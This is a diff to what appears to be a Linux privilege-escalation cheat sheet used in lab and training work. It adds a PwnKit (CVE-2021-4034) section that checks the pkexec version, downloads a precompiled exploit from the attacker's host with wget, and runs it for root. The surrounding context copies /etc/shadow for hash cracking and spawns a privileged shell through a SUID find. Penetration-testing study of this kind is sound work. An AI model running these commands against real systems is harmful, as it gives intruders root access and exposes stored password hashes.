@@ -5819,6 +5819,22 @@ cp /etc/shadow /tmp/shadow.txt
 cat /tmp/shadow.txt
 # Then crack with hashcat -m 1800
 
+# ── PKEXEC (SUID) — PWNKIT CVE-2021-4034 ───────────
+# pkexec is SUID by design but vulnerable versions = instant root
+# Affects pkexec < 0.120 — all major distros
+pkexec --version
+# 0.105 = vulnerable (lab validated: Pelican PG Play)
+# 0.105, 0.106, 0.107... up to 0.119 = all vulnerable
+
+# Precompiled exploit (fastest):
+wget http://$lhost/PwnKit -O /tmp/PwnKit
+chmod +x /tmp/PwnKit && /tmp/PwnKit
+# github.com/ly4k/PwnKit
+
+# Source compile:
+# git clone https://github.com/berdav/CVE-2021-4034
+# make && ./cve-2021-4034
+
 # ── FIND (SUID) ───────────────────────────────────────
 find / -name . -exec /bin/bash -p \; -quit
 find /tmp -exec /bin/bash -p \; -quit
